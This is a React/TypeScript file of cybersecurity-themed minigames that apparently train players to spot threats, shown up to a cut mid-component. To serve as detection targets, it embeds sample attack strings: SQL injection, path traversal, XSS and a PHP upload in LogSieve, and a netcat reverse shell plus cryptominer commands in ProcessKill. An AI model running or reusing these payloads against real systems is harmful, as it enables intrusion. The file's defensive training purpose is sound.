import React, { useState, useEffect, useRef } from 'react';

// 1. Auditor A
export const ForensicLogAnalysis: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [logs] = useState([
    "AUTH SUCCESS: local_admin (192.168.1.5)",
    "DB_QUERY: req_latency=45ms",
    "AUTH SUCCESS: guest_user (10.0.0.44)",
    "CRITICAL: UNAUTHORIZED ACCESS (RU_IP: 194.55.2.1)",
    "PING: heartbeat_ok",
    "FILE_DOWNLOAD: report_q3.pdf"
  ]);

  return (
    <div className="flex flex-col gap-4">
      <h3 className="text-xl font-bold text-blue-500">Forensic Log Analysis</h3>
      <p className="text-sm">Highlight the unauthorized access attempt from a non-standard IP:</p>
      <div className="bg-black p-4 font-mono text-xs overflow-y-auto h-48 border border-green-500">
        {logs.map((log, i) => (
          <div 
            key={i} 
            className="cursor-pointer hover:bg-white/20 p-1 mb-1 transition-colors"
            onClick={() => {
              if (log.includes("UNAUTHORIZED")) onComplete();
              else onError("Standard log. Keep looking.");
            }}
          >
            {`[${new Date().toISOString()}] ${log}`}
          </div>
        ))}
      </div>
    </div>
  );
};

// 2. Auditor B
export const SpfDkimVerification: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [selectedLock, setSelectedLock] = useState<number | null>(null);
  const [locks, setLocks] = useState([{ id: 1, type: 'Square', matched: false }, { id: 2, type: 'Circle', matched: false }, { id: 3, type: 'Triangle', matched: false }]);
  const [keys] = useState([{ id: 1, type: 'Triangle' }, { id: 2, type: 'Square' }, { id: 3, type: 'Circle' }]);
  const [selectedKey, setSelectedKey] = useState<number | null>(null);

  useEffect(() => {
    if (selectedLock !== null && selectedKey !== null) {
      const lock = locks.find(l => l.id === selectedLock);
      const key = keys.find(k => k.id === selectedKey);
      if (lock && key && lock.type === key.type) {
        setLocks(prev => prev.map(l => l.id === selectedLock ? { ...l, matched: true } : l));
      } else {
        onError("Verification Failed!");
      }
      setSelectedLock(null);
      setSelectedKey(null);
    }
  }, [selectedLock, selectedKey]);

  useEffect(() => {
    if (locks.every(l => l.matched)) onComplete();
  }, [locks, onComplete]);

  return (
    <div className="flex flex-col gap-4">
      <h3 className="text-xl font-bold text-blue-500">SPF/DKIM Verification</h3>
      <p className="text-sm">Select a Key, then select its matching Lock.</p>
      
      <div className="flex justify-between items-center mb-4">
        <div className="flex flex-col gap-2">
          <p className="text-center font-bold">KEYS</p>
          {keys.map(k => (
            <button 
              key={k.id} 
              className={`p-4 border-2 ${selectedKey === k.id ? 'border-yellow-400 bg-yellow-400/20' : 'border-blue-500 bg-gray-800'}`}
              onClick={() => setSelectedKey(k.id)}
            >
              {k.type}
            </button>
          ))}
        </div>
        <div className="text-2xl font-bold text-gray-500">→</div>
        <div className="flex flex-col gap-2">
          <p className="text-center font-bold">INBOX LOCKS</p>
          {locks.map(l => (
            <button 
              key={l.id} 
              className={`p-4 border-2 ${l.matched ? 'border-green-500 bg-green-500/20' : (selectedLock === l.id ? 'border-red-400' : 'border-gray-500 bg-gray-900')}`}
              onClick={() => !l.matched && setSelectedLock(l.id)}
              disabled={l.matched}
            >
              {l.matched ? 'VERIFIED' : l.type + ' Lock'}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};

// 3. Gatekeeper A
export const TrafficRerouting: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  // Simplified Pipe Dream: 3 pipes must be aligned horizontally (-)
  const [pipes, setPipes] = useState([90, 0, 270]); // rotation in degrees

  const rotatePipe = (index: number) => {
    setPipes(prev => {
      const next = [...prev];
      next[index] = (next[index] + 90) % 360;
      return next;
    });
  };

  useEffect(() => {
    if (pipes.every(p => p === 0 || p === 180)) {
      onComplete();
    }
  }, [pipes, onComplete]);

  return (
    <div className="flex flex-col gap-4 items-center">
      <h3 className="text-xl font-bold text-blue-500">Traffic Rerouting</h3>
      <p className="text-sm text-center">Rotate the pipes to connect the Clean Traffic line.</p>
      <div className="flex items-center gap-1 mt-4">
        <div className="bg-green-500 text-black px-2 py-1 font-bold">IN</div>
        {pipes.map((rot, i) => (
          <div 
            key={i}
            className="w-16 h-16 bg-gray-800 border-2 border-slate-600 flex items-center justify-center cursor-pointer hover:bg-gray-700"
            onClick={() => rotatePipe(i)}
          >
            <div className="w-full h-4 bg-green-400 transition-transform duration-200" style={{ transform: `rotate(${rot}deg)` }} />
          </div>
        ))}
        <div className="bg-green-500 text-black px-2 py-1 font-bold">OUT</div>
      </div>
    </div>
  );
};

// 4. Gatekeeper B
export const DecryptionKeyGen: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [val, setVal] = useState("");
  // Pattern: powers of 2 (2, 4, 8, 16, 32)
  return (
    <div className="flex flex-col gap-4">
      <h3 className="text-xl font-bold text-blue-500">Decryption Key Gen</h3>
      <p className="text-sm">Solve the mathematical sequence to generate the key:</p>
      <div className="text-3xl font-mono tracking-widest text-center text-yellow-300 bg-black p-4 rounded border border-yellow-500/50">
        2, 4, 8, 16, ?
      </div>
      <input 
        type="number" 
        className="bg-gray-800 border-2 border-blue-500 p-4 text-center text-2xl font-mono focus:outline-none"
        placeholder="Enter next number..."
        value={val}
        onChange={(e) => {
          setVal(e.target.value);
          if (e.target.value === "32") {
            onComplete();
          }
        }}
        autoFocus
      />
    </div>
  );
};

// 5. Responder A
export const PatchManagement: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [moles, setMoles] = useState(Array(9).fill(false));
  const [score, setScore] = useState(0);

  useEffect(() => {
    if (score >= 5) {
      onComplete();
      return;
    }
    const interval = setInterval(() => {
      setMoles(prev => {
        const next = [...prev];
        const randIdx = Math.floor(Math.random() * 9);
        next[randIdx] = true;
        // Auto hide after 1 sec
        setTimeout(() => {
          setMoles(current => {
            const arr = [...current];
            arr[randIdx] = false;
            return arr;
          });
        }, 1200);
        return next;
      });
    }, 800);
    return () => clearInterval(interval);
  }, [score, onComplete]);

  return (
    <div className="flex flex-col gap-4 items-center">
      <h3 className="text-xl font-bold text-blue-500">Patch Management</h3>
      <p className="text-sm">Click vulnerabilities (Red) to patch them. Target: 5</p>
      <p className="font-bold text-green-400">Patched: {score}/5</p>
      <div className="grid grid-cols-3 gap-2 bg-gray-900 p-4 border-2 border-gray-700 rounded-lg">
        {moles.map((isVuln, i) => (
          <button
            key={i}
            className={`w-16 h-16 rounded-full border-4 transition-colors ${isVuln ? 'bg-red-500 border-red-300' : 'bg-green-900 border-green-700'}`}
            onClick={() => {
              if (isVuln) {
                setMoles(prev => { const n = [...prev]; n[i] = false; return n; });
                setScore(s => s + 1);
              }
            }}
          />
        ))}
      </div>
    </div>
  );
};

// 6. Responder B
export const MalwareReverseEngineering: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const targetSeq = ['↑', '↓', '←', '→', '↑'];
  const answerSeq = ['↑', '→', '←', '↓', '↑']; // reverse
  const [inputSeq, setInputSeq] = useState<string[]>([]);

  useEffect(() => {
    if (inputSeq.length === answerSeq.length) {
      if (inputSeq.every((val, i) => val === answerSeq[i])) {
        onComplete();
      } else {
        onError("Sequence failed. Resetting payload.");
        setInputSeq([]);
      }
    }
  }, [inputSeq, answerSeq, onComplete]);

  return (
    <div className="flex flex-col gap-4 items-center">
      <h3 className="text-xl font-bold text-blue-500">Malware Reverse Engineering</h3>
      <p className="text-sm">Memorize the sequence, then enter it in REVERSE.</p>
      
      <div className="flex gap-2 p-4 bg-black border border-red-500 mb-4 rounded items-center justify-center w-full">
        {targetSeq.map((dir, i) => <span key={i} className="text-3xl text-red-500 font-bold">{dir}</span>)}
      </div>

      <div className="flex gap-2">
         {['↑', '↓', '←', '→'].map(dir => (
           <button 
             key={dir} 
             className="w-14 h-14 bg-gray-800 border-2 border-blue-500 text-2xl hover:bg-blue-900 transition-colors"
             onClick={() => setInputSeq(prev => [...prev, dir])}
           >
             {dir}
           </button>
         ))}
      </div>
      
      <div className="mt-4 flex gap-2 h-10 items-center justify-center">
        {inputSeq.map((dir, i) => <span key={i} className="text-2xl text-blue-400">{dir}</span>)}
      </div>
    </div>
  );
};

// 7. NetSec Operator A: Log Sieve
export const LogSieve: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [logs, setLogs] = useState<{ id: number; text: string; isMalicious: boolean }[]>([]);
  const [score, setScore] = useState(0);

  const generateLog = () => {
    const isMalicious = Math.random() < 0.15; // 15% chance
    const ips = ['192.168.1.10', '10.0.0.55', '172.16.0.4', '198.51.100.22'];
    const ip = ips[Math.floor(Math.random() * ips.length)];
    const date = new Date().toISOString().substring(11, 19);
    
    let text = "";
    if (isMalicious) {
      const payloads = [
        `GET /api/v1/user?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1 200`,
        `GET /../../../../etc/passwd HTTP/1.1 403`,
        `POST /api/upload.php (Content-Type: application/x-php) HTTP/1.1 200`,
        `GET /search?q=<script>alert(1)</script> HTTP/1.1 200`
      ];
      text = `${ip} - - [${date}] "${payloads[Math.floor(Math.random() * payloads.length)]}" 512`;
    } else {
      const paths = ['/index.html', '/assets/style.css', '/api/users', '/favicon.ico', '/dashboard?ref=1'];
      text = `${ip} - - [${date}] "GET ${paths[Math.floor(Math.random() * paths.length)]} HTTP/1.1" 200 1024`;
    }

    return { id: Date.now() + Math.random(), text, isMalicious };
  };

  useEffect(() => {
    const initial = Array.from({ length: 8 }).map(generateLog);
    setLogs(initial);

    const interval = setInterval(() => {
      setLogs(prev => {
        const newLogs = [...prev, generateLog()];
        if (newLogs.length > 15) return newLogs.slice(newLogs.length - 15);
        return newLogs;
      });
    }, 1200);
    return () => clearInterval(interval);
  }, []);

  const handleClick = (log: any) => {
    if (log.isMalicious) {
      const newScore = score + 1;
      setScore(newScore);
      setLogs(prev => prev.filter(l => l.id !== log.id));
      if (newScore >= 3) onComplete();
    } else {
      setScore(Math.max(0, score - 1));
      setLogs(prev => prev.filter(l => l.id !== log.id));
    }
  };

  return (
    <div className="flex flex-col gap-2 w-full h-full text-left font-mono">
      <h3 className="text-lg font-bold text-blue-500 mb-1">Log Sieve (Traffic Analysis)</h3>
      <p className="text-xs text-gray-300 mb-2">Identify and drop the malicious payloads (SQLi, LFI, XSS). ({score}/3)</p>
      
      <div className="bg-black p-2 text-[10px] sm:text-xs overflow-hidden h-64 border border-slate-700 flex flex-col gap-1">
        {logs.map((log) => (
          <div 
            key={log.id} 
            className="cursor-pointer hover:bg-slate-800 p-1 border-l-2 border-transparent hover:border-blue-500 text-gray-400 truncate"
            onClick={() => handleClick(log)}
          >
            {log.text}
          </div>
        ))}
      </div>
    </div>
  );
};

// 8. NetSec Operator B: ACL Match
export const AclMatch: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [score, setScore] = useState(0);
  const [packet, setPacket] = useState<{ src: string; dpt: number; proto: string; shouldAllow: boolean }>({ src: '192.168.1.10', dpt: 80, proto: 'TCP', shouldAllow: true });
  
  const rules = [
    { id: 1, action: 'DROP',  src: '10.10.10.0/24', dpt: '22',      proto: 'TCP' },
    { id: 2, action: 'ALLOW', src: '10.10.10.5',    dpt: '22',      proto: 'TCP' },  // shadow by rule 1!
    { id: 3, action: 'ALLOW', src: '192.168.1.0/24',dpt: '80,443',  proto: 'TCP' },
    { id: 4, action: 'DROP',  src: 'ANY',            dpt: '53',      proto: 'UDP' },
    { id: 5, action: 'DROP',  src: '172.16.0.0/12',  dpt: 'ANY',    proto: 'ANY' },
    { id: 6, action: 'ALLOW', src: 'ANY',            dpt: '8080',    proto: 'TCP' },
    { id: 7, action: 'DROP',  src: 'ANY',            dpt: 'ANY',     proto: 'ANY' },
  ];

  // eslint-disable-next-line react-hooks/exhaustive-deps
  const generatePacket = () => {
    const packets = [
      { src: '10.10.10.5',   dpt: 22,   proto: 'TCP', shouldAllow: false }, // Rule 1 shadows Rule 2 — DROP
      { src: '10.10.10.99',  dpt: 22,   proto: 'TCP', shouldAllow: false }, // Rule 1 — DROP
      { src: '192.168.1.50', dpt: 443,  proto: 'TCP', shouldAllow: true  }, // Rule 3 — ALLOW
      { src: '192.168.1.50', dpt: 22,   proto: 'TCP', shouldAllow: false }, // Misses rules 1(subnet) and 3(port), hits Rule 7 — DROP
      { src: '8.8.8.8',      dpt: 53,   proto: 'UDP', shouldAllow: false }, // Rule 4 — DROP
      { src: '172.16.5.1',   dpt: 8080, proto: 'TCP', shouldAllow: false }, // Rule 5 blocks before Rule 6 — DROP
      { src: '10.0.0.1',     dpt: 8080, proto: 'TCP', shouldAllow: true  }, // Rule 6 — ALLOW
      { src: '9.9.9.9',      dpt: 443,  proto: 'TCP', shouldAllow: false }, // No rule matches until Rule 7 — DROP
    ];
    setPacket(packets[Math.floor(Math.random() * packets.length)]);
  };

  useEffect(() => {
    generatePacket();
  }, [score, generatePacket]);

  const handleAction = (action: 'ALLOW' | 'DROP') => {
    if ((action === 'ALLOW' && packet.shouldAllow) || (action === 'DROP' && !packet.shouldAllow)) {
      const newScore = score + 1;
      setScore(newScore);
      if (newScore >= 8) onComplete();
    } else {
      onError('FIREWALL BREACH: Incorrect rule applied. Ruleset compliance -2.');
      setScore(Math.max(0, score - 2));
      generatePacket();
    }
  };

  return (
    <div className="flex flex-col gap-4 items-center font-mono w-full text-left">
      <h3 className="text-xl font-bold text-blue-500 w-full text-center">ACL Match (Packet Filter)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 w-full text-center">Evaluate top-down firewall precedence.</p>
      
      <div className="w-full text-[10px] sm:text-xs">
        <table className="w-full bg-slate-900 border border-slate-700 text-left">
          <thead className="bg-slate-800 text-blue-400">
             <tr><th className="px-1">#</th><th>ACTION</th><th>SRC</th><th>DPT</th><th>PROTO</th></tr>
          </thead>
          <tbody>
             {rules.map(r => (
               <tr key={r.id} className="border-t border-slate-700">
                 <td className="px-1">{r.id}</td>
                 <td className={r.action === 'ALLOW' ? 'text-green-400' : 'text-red-400'}>{r.action}</td>
                 <td>{r.src}</td><td>{r.dpt}</td><td>{r.proto}</td>
               </tr>
             ))}
          </tbody>
        </table>
      </div>

      <div className="bg-black border border-yellow-500 w-full p-2 text-yellow-500 text-center text-[10px] sm:text-xs">
         <div className="text-[10px] text-gray-500 mb-1">INCOMING PACKET</div>
         <div>SRC: {packet.src} | DPT: {packet.dpt} | PROTO: {packet.proto}</div>
      </div>

      <div className="flex gap-4 w-full justify-center mt-2">
        <button className="flex-1 bg-slate-800 border-2 border-red-500 hover:bg-red-900 text-red-400 py-2 font-bold" onClick={() => handleAction('DROP')}>DROP</button>
        <button className="flex-1 bg-slate-800 border-2 border-green-500 hover:bg-green-900 text-green-400 py-2 font-bold" onClick={() => handleAction('ALLOW')}>ALLOW</button>
      </div>
      <div className="text-xs text-gray-500 w-full text-center">Compliance Score: {score}/8 {score < 0 ? '⚠️ PENALTY' : ''}</div>
    </div>
  );
};

// 9. NetSec Operator C: Geo-Fencing
export const GeoFencing: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [logs, setLogs] = useState<{user: string, loc1: string, t1: string, loc2: string, t2: string, impossible: boolean}[]>([]);

  useEffect(() => {
     // Generate 4 logs, 1 is impossible travel
     const possible1 = { user: 'admin', loc1: 'New York (US)', t1: '09:00 AM', loc2: 'New York (US)', t2: '11:15 AM', impossible: false };
     const possible2 = { user: 'svc_acct', loc1: 'London (UK)', t1: '01:00 PM', loc2: 'London (UK)', t2: '01:05 PM', impossible: false };
     const possible3 = { user: 'jsmith', loc1: 'Tokyo (JP)', t1: '08:00 AM', loc2: 'Osaka (JP)', t2: '11:30 AM', impossible: false };
     const impossible1 = { user: 'ceo_exec', loc1: 'San Francisco (US)', t1: '10:00 AM', loc2: 'Moscow (RU)', t2: '10:15 AM', impossible: true };
     
     const mix = [possible1, possible2, possible3, impossible1].sort(() => 0.5 - Math.random());
     setLogs(mix);
  }, []);

  const handleSelect = (impossible: boolean) => {
    if (impossible) {
       onComplete();
    } else {
       onError("Invalid block. Legitimate travel session severed. Reconvene.");
       // Re-shuffle or penalty
    }
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono text-left">
      <h3 className="text-xl font-bold text-blue-500 w-full text-center">Geo-Fencing (Impossible Travel)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 w-full text-center mb-2">Identify and sever the impossible travel session.</p>
      
      <div className="w-full flex flex-col gap-2 overflow-y-auto">
         {logs.map((log, i) => (
            <div key={i} className="bg-slate-900 border border-slate-700 p-2 flex flex-col text-[10px] sm:text-xs hover:border-blue-500 group relative">
               <div className="flex border-b border-slate-800 pb-1 text-gray-400 mb-1 font-bold">
                  <span>USER: {log.user}</span>
               </div>
               <div className="flex justify-between w-full">
                  <span className="text-green-400 flex-1 truncate">L1: {log.loc1} @ {log.t1}</span>
                  <span className="text-yellow-400 flex-1 truncate text-right">L2: {log.loc2} @ {log.t2}</span>
               </div>
               
               {/* Hover Sever Button overlay */}
               <div className="absolute inset-0 bg-red-900/90 hidden group-hover:flex items-center justify-center cursor-pointer" onClick={() => handleSelect(log.impossible)}>
                  <span className="text-white font-bold tracking-widest text-lg">SEVER CONNECTION</span>
               </div>
            </div>
         ))}
      </div>
    </div>
  );
};

// 10. CIRT Lead A: Process Kill
export const ProcessKill: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [procs, setProcs] = useState<{pid: number, user: string, cpu: number, mem: number, cmd: string, isBad: boolean}[]>([]);

  useEffect(() => {
     const generateProcs = () => {
        const base = [
           { pid: 1, user: 'root', cpu: 1.2, mem: 0.5, cmd: '/sbin/init', isBad: false },
           { pid: 452, user: 'root', cpu: 0.1, mem: 0.2, cmd: '/lib/systemd/systemd-journald', isBad: false },
           { pid: 890, user: 'syslog', cpu: 0.5, mem: 1.1, cmd: '/usr/sbin/rsyslogd', isBad: false },
           { pid: 1024, user: 'www-data', cpu: 2.5, mem: 4.5, cmd: 'nginx: worker process', isBad: false },
           { pid: 1025, user: 'www-data', cpu: 2.1, mem: 4.6, cmd: 'nginx: worker process', isBad: false },
           { pid: 2048, user: 'postgres', cpu: 5.4, mem: 12.0, cmd: 'postgres: 14/main', isBad: false },
           { pid: 3102, user: 'root', cpu: 0.0, mem: 0.8, cmd: 'sshd: /usr/sbin/sshd', isBad: false }
        ];
        
        // The anomaly
        const anomalies = [
           { pid: 4099, user: 'www-data', cpu: 99.9, mem: 45.0, cmd: './xmrig --donate-level 1', isBad: true },
           { pid: 4100, user: 'root', cpu: 2.0, mem: 1.0, cmd: 'nc -e /bin/sh 192.168.1.55 4444', isBad: true },
           { pid: 4101, user: 'postgres', cpu: 85.0, mem: 2.0, cmd: '/tmp/kdevtmpfsi', isBad: true },
           { pid: 4102, user: 'root', cpu: 0.5, mem: 0.1, cmd: 'svchost.exe -k netsvcs', isBad: true } // Linux shouldn't have svchost
        ];
        
        base.push(anomalies[Math.floor(Math.random() * anomalies.length)]);
        return base.sort(() => 0.5 - Math.random());
     };
     setProcs(generateProcs());
  }, []);

  const handleKill = (pid: number, isBad: boolean) => {
     if (isBad) {
        onComplete();
     } else {
        onError("CRITICAL ERROR: Killed legitimate system process. System unstable.");
        // Penalty logic could go here
     }
  };

  return (
    <div className="flex flex-col gap-2 w-full h-full text-left font-mono">
      <h3 className="text-lg font-bold text-blue-500 mb-1 w-full text-center">Process Kill (Malware Cleanup)</h3>
      <p className="text-[10px] sm:text-xs text-gray-300 mb-2 w-full text-center">Identify the anomalous process and send SIGKILL.</p>
      
      <div className="w-full overflow-x-auto bg-black border border-slate-700 p-2 h-64 overflow-y-auto">
         <table className="w-full text-[10px] sm:text-xs text-left text-gray-400">
            <thead className="bg-slate-800 text-blue-300">
               <tr>
                  <th className="p-1">PID</th>
                  <th className="p-1">USER</th>
                  <th className="p-1 text-right">CPU%</th>
                  <th className="p-1 text-right">MEM%</th>
                  <th className="p-1">COMMAND</th>
                  <th className="p-1 text-center">ACTION</th>
               </tr>
            </thead>
            <tbody>
               {procs.map(p => (
                  <tr key={p.pid} className="border-t border-slate-800 hover:bg-slate-900 group">
                     <td className="p-1">{p.pid}</td>
                     <td className="p-1 text-yellow-500">{p.user}</td>
                     <td className={`p-1 text-right ${p.cpu > 80 ? 'text-red-400 font-bold' : ''}`}>{p.cpu.toFixed(1)}</td>
                     <td className="p-1 text-right">{p.mem.toFixed(1)}</td>
                     <td className="p-1 truncate max-w-[100px] sm:max-w-[150px]">{p.cmd}</td>
                     <td className="p-1 text-center">
                        <button onClick={() => handleKill(p.pid, p.isBad)} className="hidden group-hover:inline-block bg-red-900 text-red-100 px-2 rounded hover:bg-red-700 text-[10px]">
                           SIGKILL
                        </button>
                     </td>
                  </tr>
               ))}
            </tbody>
         </table>
      </div>
    </div>
  );
};

// 11. CIRT Lead B: Node Isolation
export const NodeIsolation: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [nodes, setNodes] = useState([
     { id: 'WEB-01', x: 20, y: 30, traffic: 12, infected: false },
     { id: 'API-GW', x: 50, y: 50, traffic: 45, infected: false },
     { id: 'DB-MSTR', x: 80, y: 30, traffic: 8, infected: false },
     { id: 'HR-VDI', x: 30, y: 75, traffic: 5, infected: false },
     { id: 'DEV-ENV', x: 70, y: 75, traffic: 2, infected: false },
  ]);

  const [links, setLinks] = useState([
     { id: 'WEB-API', n1: 0, n2: 1, active: true },
     { id: 'API-DB', n1: 1, n2: 2, active: true },
     { id: 'HR-API', n1: 3, n2: 1, active: true },
     { id: 'DEV-API', n1: 4, n2: 1, active: true },
     { id: 'DEV-DB', n1: 4, n2: 2, active: true }
  ]);

  const [infectedIdx, setInfectedIdx] = useState<number>(-1);

  useEffect(() => {
     const idx = Math.floor(Math.random() * nodes.length);
     setInfectedIdx(idx);
     setNodes(prev => prev.map((n, i) => i === idx ? {...n, infected: true, traffic: 8500} : n));
  }, []);

  // Check win condition
  useEffect(() => {
     if (infectedIdx !== -1) {
        const infectedNodeId = nodes[infectedIdx].id;
        // Find links where our node is either n1 or n2
        const connectedLinks = links.filter(l => (nodes[l.n1].id === infectedNodeId || nodes[l.n2].id === infectedNodeId));
        if (connectedLinks.every(l => !l.active)) {
           onComplete();
        }
     }
  }, [links, infectedIdx, nodes, onComplete]);

  const cutLink = (id: string, n1Id: string, n2Id: string) => {
     const n1Details = nodes.find(n => n.id === n1Id);
     const n2Details = nodes.find(n => n.id === n2Id);
     if (!n1Details?.infected && !n2Details?.infected) {
        onError("WARNING: Severing healthy intra-VLAN connection. Production impact detected!");
     }
     setLinks(prev => prev.map(l => l.id === id ? {...l, active: false} : l));
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono">
      <h3 className="text-xl font-bold text-blue-500 text-center">Node Isolation (Containment)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 text-center">Identify the node with anomalous packet out-rate and sever its logical links.</p>
      
      <div className="relative w-full h-64 bg-slate-900 border border-slate-700 overflow-hidden" style={{ backgroundImage: 'linear-gradient(#1e293b 1px, transparent 1px), linear-gradient(90deg, #1e293b 1px, transparent 1px)', backgroundSize: '1rem 1rem'}}>
        <svg className="w-full h-full absolute inset-0">
          {links.map(link => {
            if (!link.active) return null;
            return (
              <line 
                key={link.id}
                x1={`${nodes[link.n1].x}%`} 
                y1={`${nodes[link.n1].y}%`} 
                x2={`${nodes[link.n2].x}%`} 
                y2={`${nodes[link.n2].y}%`} 
                stroke="#64748b" 
                strokeWidth="4" 
                className="cursor-crosshair hover:stroke-red-500 active:stroke-red-700 transition-colors"
                onClick={() => cutLink(link.id, nodes[link.n1].id, nodes[link.n2].id)}
              />
            )
          })}
        </svg>

        {nodes.map(node => (
          <div 
            key={node.id} 
            className="absolute -translate-x-1/2 -translate-y-1/2 flex flex-col items-center pointer-events-none"
            style={{ left: `${node.x}%`, top: `${node.y}%` }}
          >
             <div className="w-6 h-6 bg-slate-800 border-2 border-slate-400 rounded-sm mb-1 flex items-center justify-center">
                <div className="w-2 h-2 bg-slate-400 rounded-full animate-pulse" />
             </div>
             <span className="text-[8px] sm:text-[10px] bg-black/80 px-1 text-white whitespace-nowrap">{node.id}</span>
             <span className="text-[8px] sm:text-[10px] bg-black/80 px-1 text-yellow-400 whitespace-nowrap mt-px">{node.traffic} pkts/s</span>
          </div>
        ))}
      </div>
    </div>
  );
};

// 12. CIRT Lead C: Priority Triage
export const PriorityTriage: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [alerts, setAlerts] = useState<{id: number, time: string, severity: string, title: string, isTp: boolean}[]>([]);
  const [score, setScore] = useState(0);

  const generateAlert = () => {
     const isTp = Math.random() < 0.25;
     const time = new Date().toISOString().substring(11, 19);
     
     let severity = "LOW";
     let title = "";
     
     if (isTp) {
        severity = "CRITICAL";
        const tpTitles = [
           "Mimikatz Execution Detected (LSASS Memory Read)",
           "Kerberoasting Activity (Ticket Granting Service Request Anomaly)",
           "Golden Ticket Usage (Suspicious TGT Lifetime)",
           "Ransomware File Extension Rename Activity (.encrypted)"
        ];
        title = tpTitles[Math.floor(Math.random() * tpTitles.length)];
     } else {
        const fpTitles = [
           { s: "HIGH", t: "Failed Logon (Password Expired) - hr_user" },
           { s: "HIGH", t: "Port Scan Detected from 8.8.8.8" },
           { s: "MEDIUM", t: "Unusual Volume of Outbound Traffic (Backup Job)" },
           { s: "LOW", t: "New device connected to Guest WiFi" },
           { s: "MEDIUM", t: "Log clearing event (System Update)" }
        ];
        const fp = fpTitles[Math.floor(Math.random() * fpTitles.length)];
        severity = fp.s;
        title = fp.t;
     }

     return { id: Date.now() + Math.random(), time, severity, title, isTp };
  };

  useEffect(() => {
    const initial = Array.from({ length: 5 }).map(generateAlert);
    setAlerts(initial);

    const interval = setInterval(() => {
      setAlerts(prev => {
        const updated = [generateAlert(), ...prev];
        if (updated.length > 15) return updated.slice(0, 15);
        return updated;
      });
    }, 1800);

    return () => clearInterval(interval);
  }, []);

  const handleInvestigate = (alertObj: any) => {
     if (alertObj.isTp) {
        const newScore = score + 1;
        setScore(newScore);
        if (newScore >= 2) onComplete();
     } else {
        setScore(Math.max(0, score - 1));
     }
     setAlerts(prev => prev.filter(a => a.id !== alertObj.id));
  };

  return (
    <div className="flex flex-col gap-2 items-center w-full font-mono text-left">
      <h3 className="text-xl font-bold text-blue-500 w-full text-center">Priority Triage (SIEM Filter)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 w-full text-center">Investigate True Positive critical threats. Ignore False Positives. ({score}/2)</p>
      
      <div className="w-full flex flex-col gap-1 overflow-y-auto h-64 bg-black border border-slate-700 p-2">
         {alerts.map((a) => (
            <div key={a.id} className="border border-slate-800 p-2 flex flex-col hover:bg-slate-900 group">
               <div className="flex justify-between items-center mb-1">
                  <span className="text-[10px] text-gray-500">{a.time}</span>
                  <span className={`text-[10px] font-bold px-1 rounded ${
                     a.severity === 'CRITICAL' ? 'bg-red-900 text-red-200' : 
                     a.severity === 'HIGH' ? 'bg-orange-900 text-orange-200' : 
                     a.severity === 'MEDIUM' ? 'bg-yellow-900 text-yellow-200' : 
                     'bg-green-900 text-green-200'
                  }`}>{a.severity}</span>
               </div>
               <div className="flex justify-between items-center text-xs">
                  <span className="text-gray-300 truncate max-w-[200px]">{a.title}</span>
                  <button onClick={() => handleInvestigate(a)} className="hidden group-hover:block bg-blue-900 text-blue-100 text-[10px] px-2 py-1 rounded hover:bg-blue-700 flex-shrink-0 ml-2">INVESTIGATE</button>
               </div>
            </div>
         ))}
      </div>
    </div>
  );
};

// 13. Detection Engineer A: String Match
export const StringMatch: React.FC<{ onComplete: () => void, onError: (msg: string) => void }> = ({ onComplete, onError }) => {
  const [grid, setGrid] = useState<string[][]>([]);
  const [targetYara, setTargetYara] = useState<string[]>([]);
  const [targetRow, setTargetRow] = useState<number>(0);
  const [targetCol, setTargetCol] = useState<number>(0);

  useEffect(() => {
     const hexChars = "0123456789ABCDEF";
     const randomHex = () => hexChars[Math.floor(Math.random()*16)] + hexChars[Math.floor(Math.random()*16)];
     
     const newGrid = Array.from({length: 8}, () => Array.from({length: 6}, randomHex));
     
     const yaraSignatures = [
        ["4D", "5A", "90", "00"], // MZ header
        ["7F", "45", "4C", "46"], // ELF header
        ["50", "4B", "03", "04"], // PK zip header
        ["89", "50", "4E", "47"]  // PNG header
     ];
     
     const sig = yaraSignatures[Math.floor(Math.random() * yaraSignatures.length)];
     setTargetYara(sig);
     
     // Plant the signature
     const r = Math.floor(Math.random() * 8);
     const c = Math.floor(Math.random() * 3); // fits 4 bytes
     
     for(let i=0; i<4; i++) {
        newGrid[r][c+i] = sig[i];
     }
     
     setTargetRow(r);
     setTargetCol(c);
     setGrid(newGrid);
  }, []);

  const handleHexClick = (r: number, c: number) => {
     if (r === targetRow && c === targetCol) {
        onComplete();
     } else {
        onError("Invalid YARA match. Analyzed memory segment clean.");
     }
  };

  return (
    <div className="flex flex-col gap-4 items-center w-full font-mono">
      <h3 className="text-xl font-bold text-blue-500 text-center">String Match (Hex Hunt)</h3>
      <p className="text-[10px] sm:text-xs text-gray-400 text-center w-full px-2">Click the STARTING byte of the specified malicious header signature.</p>
      
      <div className="bg-black border border-green-800 p-2 text-green-400 text-center mb-2 shadow-[0_0_10px_rgba(21,128,61,0.5)]">
        TARGET YARA: {targetYara.join(' ')}
      </div>

      <div className="w-full bg-slate-900 border border-slate-700 p-4 font-mono text-sm md:text-base flex flex-col gap-2 relative mt-2 items-center">
         {grid.map((row, rIdx) => (
            <div key={rIdx} className="flex gap-2 sm:gap-4 justify-center">
